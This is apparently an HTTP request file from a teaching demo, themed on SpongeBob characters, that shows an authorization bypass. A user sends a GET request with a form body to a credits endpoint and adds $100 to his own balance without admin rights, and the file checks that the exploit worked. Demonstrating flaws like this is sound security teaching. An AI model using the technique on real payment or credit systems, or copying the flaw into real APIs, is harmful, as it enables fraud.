# @import ../common/setup.http
@host = {{base_host}}/v202

# Named variables for clarity
@initial_balance = 50
@exploit_amount = 100

# Seed balance for idempotent demo
{{
  await seedBalance("v202", "plankton@chum-bucket.sea", initial_balance);
  console.info("ðŸŽ¬ Demo: Plankton's balance seeded to $" + initial_balance);
}}


# As platform becomes more popular, Sandy can't keep adding credits manually
# and adds a new endpoint to automate the process.

### Sandy adds credits to Spongebob's account
POST /account/credits
X-Admin-API-Key: {{platform_api_key}}
Content-Type: application/x-www-form-urlencoded

user=spongebob@krusty-krab.sea&amount=100


# --- Exploit: Plankton can add credits to his own account ---

### Plankton checks his balance
GET /account/credits
Authorization: {{plankton_auth}}

{{
  exports.balanceBefore = parseFloat(response.parsedBody.balance);
  exports.expectedAfter = parseFloat(response.parsedBody.balance) + parseFloat(exploit_amount);
  console.info("ðŸ’° Balance BEFORE: $" + response.parsedBody.balance);
}}

?? body email == plankton@chum-bucket.sea

### --- EXPLOIT: GET request with form body adds credits ---
GET /account/credits
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount={{exploit_amount}}&user=plankton@chum-bucket.sea

{{
  console.info("ðŸš¨ EXPLOIT: Balance increased by $" + exploit_amount + " without payment!");
  console.info("ðŸ’° Balance AFTER: $" + response.parsedBody.balance);
}}

?? status == 200
?? js parseFloat(response.parsedBody.balance) == {{expectedAfter}}
